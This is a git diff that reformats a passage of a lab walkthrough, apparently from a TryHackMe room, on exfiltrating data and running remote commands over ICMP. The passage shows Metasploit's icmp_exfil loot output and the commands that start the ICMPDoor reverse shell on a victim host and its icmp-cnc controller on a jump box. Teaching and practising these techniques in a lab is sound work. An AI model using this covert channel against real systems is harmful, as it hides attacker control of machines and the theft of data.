@@ -205,33 +205,39 @@ msf5 auxiliary(server/icmp_exfil) > run
 [+] Loot filename: /root/.msf4/loot/20220425212408_default_ATTACKBOX_IP_icmp_exfil_838825.txt
 ```
 
-:tada: Nice! :tada: We have successfully transferred data over the ICMP protocol using the Metasploit Framework. You can check the loot file mentioned in the terminal to confirm the received data.
+:tada: Nice! :tada: We have successfully transferred data over the ICMP protocol using the Metasploit Framework. You can check the 💰 loot file mentioned in the terminal to confirm the received data.
 
-ICMP C2 Communication
+## ICMP C2 Communication
 
-Next, we will show executing commands over the ICMP protocol using the ICMPDoor tool. ICMPDoor is an open-source reverse-shell written in Python3 and scapy. The tool uses the same concept we discussed earlier in this task, where an attacker utilizes the Data section within the ICMP packet. The only difference is that an attacker sends a command that needs to be executed on a victim's machine. Once the command is executed, a victim machine sends the execution output within the ICMP packet in the Data section.
+Next, we will show executing commands over the $${\color{red}ICMP}$$ protocol using the [ICMPDoor](https://github.com/krabelize/icmpdoor) or at https://github.com/krabelize/icmpdoor tool. $${\color{red}ICMPDoor}$$ is an open-source reverse-shell written in **`Python3`** and **`scapy`**. The tool uses the same concept we discussed earlier in this task, where an attacker utilizes the Data section within the ICMP packet. The only difference is that an attacker sends a command that needs to be executed on a victim's machine. Once the command is executed, a victim machine sends the execution output within the ICMP packet in the Data section.
 
-C2 Communication over ICMP
+![image](https://github.com/user-attachments/assets/9aeb810c-9cae-4a25-a33c-25fcf6cd556c)
+###### C2 Communication over ICMP
 
 
-We have prepared the tools needed for C2 communication over the ICMP protocol on JumpBox and the ICMP-Host machines. First, we need to log in to the ICMP machine,icmp.thm.com, and execute the icmpdoor binary as follows,
+We have prepared the tools needed for C2 communication over the ICMP protocol on JumpBox and the ICMP-Host machines. First, we need to log in to the ICMP machine, icmp.thm.com, and execute the icmpdoor binary as follows,
 
-Run the icmpdoor command on the ICMP-Host Machine
+```bash
+🔴🟢🟡                        #Run the icmpdoor command on the ICMP-Host Machine
 thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
+```
+
 Note that we specify the interface to communicate over and the destination IP of the server-side.
 
-Next, log in to the JumpBox and execute the icmp-cnc binary to communicate with the victim, our ICMP-Host. Once the execution runs correctly, a communication channel is established over the ICMP protocol. Now we are ready to send the command that needs to be executed on the victim machine. 
+Next, log in to the JumpBox and execute the $${\color{red}icmp-cnc}$$ binary to communicate with the victim, our **`ICMP-Host`**. Once the execution runs correctly, a communication channel is established over the ICMP protocol. Now we are ready to send the command that needs to be executed on the victim machine. 
 
-The data that needs to be transferred
+```bash
+🔴🟢🟡                        #The data that needs to be transferred
 thm@jump-box$  sudo icmp-cnc -i eth1 -d 192.168.0.121
 shell: hostname
 hostname
 shell: icmp-host
-Similar to the client-side binary, ensure to select the interface for the communication as well as the destination IP. As the previous terminal shows, we requested to execute the hostname command, and we received icmp-host.
+```
+
+Similar to the client-side binary, ensure to select the interface for the communication as well as the destination IP. As the previous terminal shows, we requested to execute the **`hostname`** command, and we received **`icmp-host`**.
 
 To confirm that all communications go through the ICMP protocol, we capture the network traffic during the communication using tcpdump as the following:
+![image](https://github.com/user-attachments/assets/f66df225-582f-41c5-81f6-0a575ddd6583)
+###### Capture ICMP traffic using tcpdump
 
-Capture ICMP traffic using tcpdump
-
-
-Answer the questions below
+🎉*`End of Session`*🎉
